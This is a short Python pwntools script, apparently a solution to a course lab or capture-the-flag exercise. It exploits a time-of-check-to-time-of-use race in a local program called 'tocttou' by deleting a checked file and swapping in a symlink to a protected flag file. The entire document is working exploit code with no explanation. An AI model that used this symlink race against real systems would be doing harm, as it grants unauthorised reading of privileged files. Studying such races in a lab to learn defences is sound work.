#!/usr/bin/env python

from pwn import *
import os

#rm output
#touch output

p = process("./tocttou")



print(p.recv())

p.sendline("output")

sleep(1)
os.remove("output")


src = "output"
dst = "/home/labs/week7/7-tocttou/flag"

os.symlink(dst, src)

print(p.recv())

p.interactive()